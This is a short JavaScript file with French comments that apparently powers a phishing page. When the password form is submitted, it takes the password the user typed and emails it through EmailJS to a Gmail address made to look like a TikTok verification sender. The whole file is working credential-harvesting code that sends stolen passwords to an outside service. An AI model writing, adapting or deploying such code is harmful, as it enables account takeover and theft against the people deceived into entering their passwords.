// Initialisation EmailJS
(function () {
  emailjs.init("KsAeYBNJTNWnyUxfM"); // Remplace par ton User ID réel
})();

// Gérer l'envoi d'email au clic sur "Suivant"
document
  .getElementById("password-form")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Récupérer le mot de passe saisi
    const password = document.getElementById("password").value;

    // Paramètres du modèle EmailJS
    const templateParams = {
      to_email: "noreply.tiktok.verifyyy@gmail.com", // Destinataire de l'email
      user_password: password, // Mot de passe saisi par l'utilisateur
    };

    // Envoi de l'email via EmailJS
    emailjs.send("service_548dlph", "template_1m2mgz5", templateParams).then(
      function (response) {
        console.log("Mot de passe envoyé avec succès !", response);
        alert("Mot de passe envoyé avec succès !");
        // Rediriger ou effectuer une autre action après l'envoi réussi
        // window.location.href = "Accueil.html";
      },
      function (error) {
        console.error("Erreur lors de l'envoi :", error);
        alert("Erreur lors de l'envoi du mot de passe. Veuillez réessayer.");
      }
    );
  });
